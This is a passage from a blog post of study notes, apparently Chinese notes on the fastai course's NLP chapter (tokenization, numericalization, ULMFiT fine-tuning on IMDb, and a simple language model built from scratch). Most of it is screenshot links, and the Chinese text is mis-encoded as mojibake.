src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/275.png"><br>ä¸ºä¸Šä¸€æ­¥çš„åˆ†è¯å™¨æ‰©å±•åŠŸèƒ½ï¼šå°†å¤§å†™å­—æ¯è½¬æ¢æˆå°å†™ï¼Œå¹¶åœ¨è¯å‰ç”¨xxmajåšæ ‡è®°ï¼Œå› ä¸ºä¸€ä¸ªå•è¯æ— è®ºæ˜¯å¤§å†™è¿˜æ˜¯å°å†™éƒ½åº”è¯¥éƒ½åº”åŒä¸€ä¸ªå‘é‡<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/276.png"><br>To see the rules that were used, you can check the default rules:<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/277.png"><br>As always, you can look at the source code of each of them in a notebook by typing:<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/278.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/279.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/280.png"></p><h2 id="Subword-tokenization-å­åˆ†è¯å™¨"><a href="#Subword-tokenization-å­åˆ†è¯å™¨" class="headerlink" title="Subword tokenization(å­åˆ†è¯å™¨"></a>Subword tokenization(å­åˆ†è¯å™¨</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/281.png"><br>åœ¨è¯­æ–™åº“ä¸­æ‰¾å‡ºç°é¢‘æ¬¡æœ€é«˜çš„å­—ç¬¦ç»„åˆï¼Œæ„æˆå•è¯<br>æ¯”å¦‚ï¼š<br>â€˜æˆ‘çš„â€™ä¼šç»å¸¸å‡ºç°ï¼Œå› ä¸ºä»–çš„æ„æ€æ˜¯â€˜myâ€™<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/282.png"><br>æˆ‘ä»¬å®ä¾‹åŒ–æ ‡è®°å™¨ï¼Œä¼ å…¥è¦åˆ›å»ºçš„vocabçš„å¤§å°ï¼Œç„¶åéœ€è¦â€œè®­ç»ƒâ€å®ƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦è®©å®ƒé˜…è¯»æˆ‘ä»¬çš„æ–‡æ¡£ï¼Œæ‰¾åˆ°å…±åŒçš„å­—ç¬¦åºåˆ—æ¥åˆ›å»ºvocabã€‚è¿™æ˜¯é€šè¿‡è®¾ç½®å®Œæˆçš„ã€‚æˆ‘ä»¬å¾ˆå¿«å°±ä¼šçœ‹åˆ°ï¼Œsetupæ˜¯ä¸€ç§ç‰¹æ®Šçš„fastaiæ–¹æ³•ï¼Œåœ¨æˆ‘ä»¬é€šå¸¸çš„æ•°æ®å¤„ç†ç®¡é“ä¸­è‡ªåŠ¨è°ƒç”¨ã€‚ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬ç°åœ¨éƒ½æ˜¯æ‰‹å·¥æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è‡ªå·±è°ƒç”¨å®ƒã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå¯¹ç»™å®šçš„vocabå¤§å°æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼Œå¹¶æ˜¾ç¤ºä¸€ä¸ªç¤ºä¾‹è¾“å‡ºï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/283.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/284.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/285.png"></p><h3 id="Numericalization-with-fastai"><a href="#Numericalization-with-fastai" class="headerlink" title="Numericalization with fastai"></a>Numericalization with fastai</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/286.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/287.png"><br>å¯¹ä¸Šä¸€æ­¥åˆ†å¥½çš„å•è¯ï¼Œæ¯ä¸ªå•è¯éƒ½ç¼–ä¸€ä¸ªå·<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/288.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/289.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/290.png"><br>é»˜è®¤çš„è¯æ±‡é‡æ˜¯60000ï¼Œä¹Ÿå°±æ˜¯embeddingçŸ©é˜µçš„å¤§å°ï¼Œå¦‚æœè¿˜æœ‰æ²¡è¦†ç›–åˆ°çš„ï¼Œå°±æ›¿æ¢åˆ°å‡ºç°é¢‘æ¬¡æœ€ä½çš„è¯<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/291.png"><br>å˜å›åŸæ¥çš„æ ·å­<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/292.png"></p><h2 id="batch"><a href="#batch" class="headerlink" title="batch"></a>batch</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/293.png"><br>å¯¹æœ‰å‡ ç™¾ä¸‡tokençš„IMDBæ•°æ®æ¥è¯´ï¼Œæ¯è¡Œæ•°æ®å¤ªå¤šï¼Œæ‰€ä»¥è¦è¿›è¡Œæ‹†åˆ†ï¼ˆç”¨åˆ—æ‹†åˆ†ï¼‰<br>ä¸¾ä¸ªä¾‹å­ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/294.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/295.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/296.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/297.png"><br>ä»¥ä¸Šå¾—åˆ°çš„å°±æ˜¯ä¸‰ä¸ªmini-batchï¼Œæ³¨æ„è¡Œå’Œè¡Œä¹‹é—´æ˜¯å®Œå…¨ç‹¬ç«‹çš„<br>ä»¥ä¸Šæ­¥éª¤å¾ˆéº»çƒ¦ï¼Œä¸è¿‡éƒ½ä¸ç”¨æˆ‘ä»¬è‡ªå·±åšï¼Œç›´æ¥ç”¨fastaiçš„LMDataLoaderå°±è¡Œ</p><h2 id="ä½¿ç”¨fastai"><a href="#ä½¿ç”¨fastai" class="headerlink" title="ä½¿ç”¨fastai"></a>ä½¿ç”¨fastai</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/298.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/299.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/300.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/301.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/302.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/303.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/304.png"><br>ä¸Šå›¾ä¸­çš„å‰ä¸¤è¡Œå¿…ä¸å¯å°‘ï¼Œsetupï¼ˆï¼‰ç”¨æ¥åˆ›å»ºå­—å…¸<br>æ•°å­—åŒ–ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/305.png"><br>ï¼ˆä¸Šå›¾æ•ˆæœæ¼”ç¤ºï¼š<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/306.png">ï¼‰<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/307.png"><br>64æ˜¯batch-sizeï¼Œåºåˆ—é•¿åº¦æ˜¯72<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/308.png"><br>ï¼ˆxxunkè¡¨ç¤ºvocabä¸­æ²¡æœ‰ è¿™ä¸ªè¯ï¼‰<br>å†çœ‹çœ‹éªŒè¯é›†ä¸­çš„æ•°æ®<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/309.png"><br>å¯ä»¥çœ‹åˆ°éªŒè¯é›†çš„æ•°æ®ç›¸æ¯”è®­ç»ƒé›†å·¦ç§»äº†ä¸€ä½</p><h3 id="Training-a-text-classifier"><a href="#Training-a-text-classifier" class="headerlink" title="Training a text classifier"></a>Training a text classifier</h3><h4 id="Language-model-using-DataBlock"><a href="#Language-model-using-DataBlock" class="headerlink" title="Language model using DataBlock"></a>Language model using DataBlock</h4><p>å½“TextBlockä¼ é€’ç»™DataBlockæ—¶ï¼Œfastaiè‡ªåŠ¨å¤„ç†æ ‡è®°åŒ–å’Œæ•°å€¼åŒ–ã€‚å¯ä»¥ä¼ é€’ç»™Tokenizeå’ŒNumericalizeçš„æ‰€æœ‰å‚æ•°ä¹Ÿå¯ä»¥ä¼ é€’ç»™TextBlockã€‚åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºåˆ†åˆ«è¿è¡Œè¿™äº›æ­¥éª¤çš„æœ€ç®€å•æ–¹æ³•ï¼Œä»¥ç®€åŒ–è°ƒè¯•ï¼Œä½†æ‚¨å§‹ç»ˆå¯ä»¥é€šè¿‡åœ¨å‰å‡ èŠ‚ä¸­æ‰€ç¤ºçš„æ•°æ®å­é›†ä¸Šæ‰‹åŠ¨è¿è¡Œè¿™äº›æ­¥éª¤æ¥è¿›è¡Œè°ƒè¯•ã€‚åˆ«å¿˜äº†DataBlockä¾¿æ·çš„summaryæ–¹æ³•ï¼Œå®ƒå¯¹äºè°ƒè¯•æ•°æ®é—®é¢˜éå¸¸æœ‰ç”¨<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/310.png"><br>è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªç±»æ–¹æ³•ï¼Œå¯ä»¥å­˜å‚¨åˆ†è¯çš„ç»“æœåˆ°è¿™é‡Œé¢ï¼Œä¸‹æ¬¡å¯ä»¥ä»å­˜å‚¨çš„æ•°æ®æ¥ç€è¿è¡Œ</p><p>ä¸ä»¥å‰åœ¨DataBlockä¸­ä½¿ç”¨çš„ç±»å‹ä¸åŒçš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘ä»¬ä¸ä»…ä»…ç›´æ¥ä½¿ç”¨ç±»ï¼ˆå³TextBlockï¼ˆâ€¦ï¼‰ï¼Œè€Œæ˜¯è°ƒç”¨ç±»æ–¹æ³•ã€‚ç±»æ–¹æ³•æ˜¯ä¸€ç§Pythonæ–¹æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒå±äºç±»è€Œä¸æ˜¯å¯¹è±¡(å¦‚æœæ‚¨ä¸ç†Ÿæ‚‰ç±»æ–¹æ³•ï¼Œè¯·åŠ¡å¿…åœ¨çº¿æœç´¢æœ‰å…³å®ƒä»¬çš„æ›´å¤šä¿¡æ¯ï¼Œå› ä¸ºå®ƒä»¬åœ¨è®¸å¤šPythonåº“å’Œåº”ç”¨ç¨‹åºä¸­éƒ½å¾ˆå¸¸ç”¨ï¼›æˆ‘ä»¬ä»¥å‰åœ¨ä¹¦ä¸­ä½¿ç”¨è¿‡å‡ æ¬¡ï¼Œä½†æ²¡æœ‰å¼•èµ·æ³¨æ„ã€‚ï¼‰TextBlockä¹‹æ‰€ä»¥ç‰¹åˆ«ï¼Œæ˜¯å› ä¸ºè®¾ç½®numericalizerçš„vocabå¯èƒ½éœ€è¦å¾ˆé•¿æ—¶é—´ï¼ˆæˆ‘ä»¬å¿…é¡»é˜…è¯»å¹¶æ ‡è®°æ¯ä¸ªæ–‡æ¡£æ‰èƒ½è·å¾—vocabï¼‰ã€‚ä¸ºäº†å°½å¯èƒ½åœ°æé«˜æ•ˆç‡ï¼Œå®ƒæ‰§è¡Œäº†ä¸€äº›ä¼˜åŒ–ï¼šâ€¢å®ƒå°†æ ‡è®°åŒ–æ–‡æ¡£ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œå› æ­¤ä¸å¿…å¤šæ¬¡æ ‡è®°åŒ–æ–‡æ¡£â€¢å®ƒå¹¶è¡Œè¿è¡Œå¤šä¸ªæ ‡è®°åŒ–è¿›ç¨‹ï¼Œä»¥åˆ©ç”¨è®¡ç®—æœºçš„CPUæˆ‘ä»¬éœ€è¦å‘Šè¯‰TextBlockå¦‚ä½•è®¿é—®æ–‡æœ¬ï¼Œæ‰€ä»¥å®ƒå¯ä»¥åšè¿™ä¸ªåˆå§‹çš„é¢„å¤„ç†ï¼Œè¿™æ˜¯ä»\uæ–‡ä»¶å¤¹åšçš„ã€‚æ˜¾ç¤º\uæ‰¹å¤„ç†ç„¶åä»¥é€šå¸¸çš„æ–¹å¼å·¥ä½œï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/311.png"><br>ä¹Ÿå°±æ˜¯è¯´show_batches()ä¼šè‡ªåŠ¨de-æ•°å­—åŒ–</p><h3 id="Fine-tuning-the-language-model"><a href="#Fine-tuning-the-language-model" class="headerlink" title="Fine tuning the language model"></a>Fine tuning the language model</h3><h4 id="åˆ›å»ºå­¦ä¹ å™¨"><a href="#åˆ›å»ºå­¦ä¹ å™¨" class="headerlink" title="åˆ›å»ºå­¦ä¹ å™¨"></a>åˆ›å»ºå­¦ä¹ å™¨</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/312.png"><br>è®©æˆ‘ä»¬å›åˆ°æœ¬ç« å¼€å¤´çš„æµç¨‹å›¾ã€‚ç¬¬ä¸€ä¸ªarrowå·²ä¸ºæˆ‘ä»¬å®Œæˆï¼Œå¹¶åœ¨fastaiä½œä¸ºé¢„è®­ç»ƒæ¨¡å‹æä¾›ï¼Œ<br>æˆ‘ä»¬åˆšåˆšä¸ºç¬¬äºŒé˜¶æ®µæ„å»ºäº†æ•°æ®åŠ è½½å™¨å’Œå­¦ä¹ å™¨ã€‚ç°åœ¨<br>æˆ‘ä»¬å·²ç»å‡†å¤‡å¥½å¾®è°ƒæˆ‘ä»¬çš„è¯­è¨€æ¨¡å‹äº†ï¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/313.png"><br>è®­ç»ƒæ¯ä¸ªepochéœ€è¦ç›¸å½“é•¿çš„æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å°†åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ä¿å­˜ä¸­é—´æ¨¡å‹ç»“æœã€‚å› ä¸ºå¾®è°ƒä¸é€‚åˆæˆ‘ä»¬ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†ä½¿ç”¨fit\u one\u cycleã€‚å°±åƒcnn\u learnerä¸€æ ·ï¼Œlanguage\u model\u learneråœ¨ä½¿ç”¨é¢„è®­ç»ƒæ¨¡å‹ï¼ˆè¿™æ˜¯é»˜è®¤å€¼ï¼‰æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨freezeï¼Œå› æ­¤è¿™åªä¼šè®­ç»ƒåµŒå…¥ï¼ˆæ¨¡å‹ä¸­å”¯ä¸€åŒ…å«éšæœºåˆå§‹åŒ–æƒé‡çš„éƒ¨åˆ†ï¼Œå³åµŒå…¥IMDb vocabä¸­ä½†ä¸åœ¨é¢„è®­ç»ƒæ¨¡å‹vocabä¸­çš„å•è¯ï¼‰ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/314.png"></p><h3 id="Saving-and-Loading-Models"><a href="#Saving-and-Loading-Models" class="headerlink" title="Saving and Loading Models"></a>Saving and Loading Models</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/315.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/316.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/317.png"><br>è¡Œè¯ï¼šç¼–ç å™¨ï¼šæ¨¡å‹ä¸åŒ…æ‹¬ç‰¹å®šäºä»»åŠ¡çš„æœ€ç»ˆå±‚ã€‚å½“åº”ç”¨äºè§†è§‰CNNæ—¶ï¼Œè¿™ä¸ªæœ¯è¯­å’Œèº«ä½“çš„å«ä¹‰åŸºæœ¬ç›¸åŒï¼Œä½†â€œç¼–ç å™¨â€å¾€å¾€æ›´å¤šåœ°ç”¨äºNLPå’Œç”Ÿæˆæ¨¡å‹ã€‚<br>å¾—åˆ°ä¸åŒ…æ‹¬æœ€åä¸€å±‚çš„modelï¼Œè¿™æ˜¯ä¸ªé¢„è®­ç»ƒæ¨¡å‹ï¼Œä»–ç»è¿‡äº†wikiå’Œimdbä¸‹ä¸€ä¸ªè¯é¢„æµ‹çš„åŒé‡é¢„è®­ç»ƒï¼Œä¹‹åå¼€å§‹å°†è¿™ä¸ªæ¨¡å‹ç”¨äºåˆ†ç±»ä»»åŠ¡ã€‚</p><h2 id="Text-generation"><a href="#Text-generation" class="headerlink" title="Text generation"></a>Text generation</h2><p>å…ˆè¯•è¯•ç”¨ä¸Šé¢çš„æ¨¡å‹çš„é¢„æµ‹ä¸‹ä¸€ä¸ªè¯çš„åŠŸèƒ½åšä¸ªæ–‡æœ¬ç”Ÿæˆæ¨¡å‹ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/318.png"><br>å¦‚æ‚¨æ‰€è§ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€äº›éšæœºæ€§ï¼ˆæˆ‘ä»¬æ ¹æ®æ¨¡å‹è¿”å›çš„æ¦‚ç‡é€‰æ‹©ä¸€ä¸ªéšæœºè¯ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä¸ä¼šå¾—åˆ°å®Œå…¨ç›¸åŒçš„è¯„è®ºä¸¤æ¬¡ã€‚æˆ‘ä»¬çš„æ¨¡å‹æ²¡æœ‰ä»»ä½•å…³äºå¥å­ç»“æ„æˆ–è¯­æ³•è§„åˆ™çš„ç¼–ç¨‹çŸ¥è¯†ï¼Œä½†æ˜¯å®ƒå·²ç»æ¸…æ¥šåœ°äº†è§£äº†å¾ˆå¤šè‹±è¯­å¥å­ï¼šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒé€‚å½“åœ°å¤§å†™ï¼ˆæˆ‘åªæ˜¯è½¬æ¢æˆIï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬çš„è§„åˆ™éœ€è¦ä¸¤ä¸ªå­—ç¬¦æˆ–æ›´å¤šçš„å­—æ¥è€ƒè™‘ä¸€ä¸ªè¯å¤§å†™ï¼Œæ‰€ä»¥å®ƒæ˜¯æ­£å¸¸çš„çœ‹åˆ°å®ƒå°å†™ï¼‰å’Œä½¿ç”¨ä¸€è‡´çš„æ—¶æ€ã€‚æ€»è¯„ä¹ä¸€çœ‹æ˜¯æœ‰é“ç†çš„ï¼Œåªæœ‰ä»”ç»†é˜…è¯»ï¼Œä½ æ‰èƒ½æ³¨æ„åˆ°æœ‰äº›ä¸œè¥¿æœ‰ç‚¹ä¸å¯¹åŠ²ã€‚å¯¹ä¸€ä¸ªå‡ ä¸ªå°æ—¶è®­ç»ƒçš„æ¨¡ç‰¹æ¥è¯´è¿˜ä¸é”™ï¼ä½†æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡ä¸æ˜¯è®­ç»ƒä¸€ä¸ªæ¨¡å‹æ¥ç”Ÿæˆè¯„è®ºï¼Œè€Œæ˜¯å¯¹å®ƒä»¬è¿›è¡Œåˆ†ç±»ã€‚ã€‚ã€‚æ‰€ä»¥è®©æˆ‘ä»¬ç”¨è¿™ä¸ªæ¨¡å‹æ¥åšã€‚</p><h2 id="Creating-the-Classifier-DataLoaders"><a href="#Creating-the-Classifier-DataLoaders" class="headerlink" title="Creating the Classifier DataLoaders"></a>Creating the Classifier DataLoaders</h2><p>ä½¿ç”¨ä¹‹å‰åšå¥½çš„è¯­æ–™åº“ï¼Œå› ä¸ºè¯­æ–™åº“è¦æ˜¯ä¸åŒé‚£ä¹‹å‰çš„é¢„è®­ç»ƒå°±æ²¡æœ‰æ„ä¹‰äº†<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/319.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/320.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/321.png"><br>ä¸æ˜¯è¯­è¨€æ¨¡å‹äº†ï¼Œç°åœ¨æ˜¯åˆ†ç±»æ¨¡å‹<br>åˆ†ç±»æ¨¡å‹æ–‡æœ¬ä¸èƒ½åƒè¯­è¨€æ¨¡å‹é‚£æ ·ç›´æ¥åˆ‡å‰²<br>fastaiä¼šæŠŠç›¸ä¼¼é•¿åº¦çš„æ–‡æœ¬æ”¾åœ¨åŒä¸€ä¸ªbatchä¸­ï¼Œä¸åŒçš„é•¿åº¦å†ç”¨paddingè¡¥é½<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/322.png"><br>å¦‚ç”¨paddingæŠŠæ‰€æœ‰éƒ½è¡¥æˆ581<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/323.png"></p><h2 id="Fine-Tuning-the-Classifier"><a href="#Fine-Tuning-the-Classifier" class="headerlink" title="Fine-Tuning the Classifier"></a>Fine-Tuning the Classifier</h2><p>æœ€åä¸€æ­¥æ˜¯ä»¥æœ‰åŒºåˆ«çš„å­¦ä¹ é€Ÿåº¦è¿›è¡Œè®­ç»ƒï¼Œå¹¶é€æ¸è§£å†»ã€‚åœ¨è®¡ç®—æœºè§†è§‰ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¸€æ¬¡è§£å†»æ¨¡å‹ï¼Œä½†å¯¹äºNLPåˆ†ç±»å™¨ï¼Œæˆ‘ä»¬å‘ç°ä¸€æ¬¡è§£å†»å‡ å±‚ä¼šäº§ç”ŸçœŸæ­£çš„å½±å“ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/324.png"><br>ä»…ä»…åœ¨ä¸€ä¸ªepoché‡Œï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†å’Œæˆ‘ä»¬åœ¨&lt;&gt;ä¸­è®­ç»ƒä¸€æ ·çš„ç»“æœï¼šè¿˜ä¸é”™ï¼æˆ‘ä»¬å¯ä»¥é€šè¿‡-2å†»ç»“\ï¼Œå†»ç»“é™¤æœ€åä¸¤ä¸ªå‚æ•°ç»„ä»¥å¤–çš„æ‰€æœ‰å‚æ•°ç»„ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/325.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/326.png"><br>æˆ‘ä»¬çš„å‡†ç¡®ç‡è¾¾åˆ°äº†94.3%ï¼Œè¿™æ˜¯ä¸‰å¹´å‰æœ€å…ˆè¿›çš„è¡¨ç°ã€‚é€šè¿‡å¯¹æ‰€æœ‰å‘åé˜…è¯»çš„æ–‡æœ¬è®­ç»ƒå¦ä¸€ä¸ªæ¨¡å‹å¹¶å¹³å‡è¿™ä¸¤ä¸ªæ¨¡å‹çš„é¢„æµ‹ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥è¾¾åˆ°95.1%çš„å‡†ç¡®ç‡ï¼Œè¿™æ˜¯ULMFiTè®ºæ–‡ä»‹ç»çš„æœ€æ–°æŠ€æœ¯ã€‚å°±åœ¨å‡ ä¸ªæœˆå‰ï¼Œé€šè¿‡å¾®è°ƒä¸€ä¸ªæ›´å¤§çš„æ¨¡å‹å’Œä½¿ç”¨æ˜‚è´µçš„æ•°æ®æ‰©å……æŠ€æœ¯ï¼ˆå°†å¥å­ç¿»è¯‘æˆå¦ä¸€ç§è¯­è¨€ï¼Œç„¶åä½¿ç”¨å¦ä¸€ç§æ¨¡å‹è¿›è¡Œç¿»è¯‘ï¼‰ï¼Œå®ƒæ‰è¢«æ‰“è´¥ã€‚ä½¿ç”¨ä¸€ä¸ªé¢„å…ˆè®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œè®©æˆ‘ä»¬æ„å»ºä¸€ä¸ªç»è¿‡å¾®è°ƒçš„è¯­è¨€æ¨¡å‹ï¼Œå®ƒéå¸¸å¼ºå¤§ï¼Œå¯ä»¥ç”Ÿæˆå‡è¯„è®ºï¼Œä¹Ÿå¯ä»¥å¸®åŠ©åˆ†ç±»è¯„è®ºã€‚è¿™æ˜¯ä»¤äººå…´å¥‹çš„äº‹æƒ…ï¼Œä½†è¦è®°ä½ï¼Œè¿™é¡¹æŠ€æœ¯ä¹Ÿå¯ä»¥ç”¨äºæ¶æ„ç›®çš„ã€‚</p><h2 id="æ–‡æœ¬çš„æ•°æ®å¢å¼º"><a href="#æ–‡æœ¬çš„æ•°æ®å¢å¼º" class="headerlink" title="æ–‡æœ¬çš„æ•°æ®å¢å¼º"></a>æ–‡æœ¬çš„æ•°æ®å¢å¼º</h2><p>arXivæŸ¥è®ºæ–‡Unsupervised Data Augmentation for Consistency Training</p><h2 id="å®‰å…¨éšæ‚£"><a href="#å®‰å…¨éšæ‚£" class="headerlink" title="å®‰å…¨éšæ‚£"></a>å®‰å…¨éšæ‚£</h2><p>fast.aiæœSciPy Keynote</p><h1 id="NLP-drive"><a href="#NLP-drive" class="headerlink" title="NLP_drive"></a>NLP_drive</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/327.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/328.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/329.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/330.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/331.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/332.png"></p><h2 id="Our-First-Language-Model-from-Scratch"><a href="#Our-First-Language-Model-from-Scratch" class="headerlink" title="Our First Language Model from Scratch"></a>Our First Language Model from Scratch</h2><p>æŠŠå®ƒå˜æˆç¥ç»ç½‘ç»œçš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯æŒ‡å®šæˆ‘ä»¬è¦æ ¹æ®å‰é¢çš„ä¸‰ä¸ªå•è¯æ¥é¢„æµ‹æ¯ä¸ªå•è¯ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç”±ä¸‰ä¸ªå•è¯ç»„æˆçš„æ¯ä¸ªåºåˆ—çš„åˆ—è¡¨ä½œä¸ºè‡ªå˜é‡ï¼Œæ¯ä¸ªåºåˆ—åé¢çš„ä¸‹ä¸€ä¸ªå•è¯ä½œä¸ºå› å˜é‡ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/333.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/334.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/335.png"><br>æˆ‘ä»¬ç°åœ¨å¯ä»¥åˆ›å»ºä¸€ä¸ªç¥ç»ç½‘ç»œç»“æ„ï¼Œå°†ä¸‰ä¸ªå•è¯ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¿”å›å¯¹vocabä¸­æ¯ä¸ªå¯èƒ½çš„ä¸‹ä¸€ä¸ªå•è¯çš„æ¦‚ç‡çš„é¢„æµ‹ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ä¸‰ä¸ªæ ‡å‡†çº¿æ€§å±‚ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªè°ƒæ•´ã€‚ç¬¬ä¸€ä¸ªè°ƒæ•´æ˜¯ç¬¬ä¸€ä¸ªçº¿æ€§å±‚å°†åªä½¿ç”¨ç¬¬ä¸€ä¸ªå•è¯çš„åµŒå…¥ä½œä¸ºæ¿€æ´»ï¼Œç¬¬äºŒä¸ªå±‚å°†ä½¿ç”¨ç¬¬äºŒä¸ªå•è¯çš„åµŒå…¥åŠ ä¸Šç¬¬ä¸€ä¸ªå±‚çš„è¾“å‡ºæ¿€æ´»ï¼Œç¬¬ä¸‰å±‚å°†ä½¿ç”¨ç¬¬ä¸‰ä¸ªå•è¯çš„åµŒå…¥åŠ ä¸Šç¬¬äºŒå±‚çš„è¾“å‡ºæ¿€æ´»ã€‚è¿™æ ·åšçš„å…³é”®æ•ˆæœæ˜¯ï¼Œæ¯ä¸ªå•è¯éƒ½æ˜¯åœ¨å®ƒå‰é¢çš„ä»»ä½•å•è¯çš„ä¿¡æ¯ä¸Šä¸‹æ–‡ä¸­è§£é‡Šçš„ï¼Œç¬¬äºŒä¸ªè°ƒæ•´æ˜¯è¿™ä¸‰ä¸ªå±‚ä¸­çš„æ¯ä¸€å±‚éƒ½å°†ä½¿ç”¨ç›¸åŒçš„æƒé‡çŸ©é˜µã€‚ä¸€ä¸ªå•è¯å½±å“å‰ä¸€ä¸ªå•è¯æ¿€æ´»çš„æ–¹å¼ä¸åº”å› å•è¯çš„ä½ç½®è€Œæ”¹å˜ã€‚æ¢è¨€ä¹‹ï¼Œæ¿€æ´»å€¼å°†éšç€æ•°æ®åœ¨å±‚ä¸­çš„ç§»åŠ¨è€Œæ”¹å˜ï¼Œä½†å±‚æƒé‡æœ¬èº«ä¸ä¼šå› å±‚è€Œå¼‚ã€‚å› æ­¤ï¼Œä¸€ä¸ªå±‚ä¸å­¦ä¹ 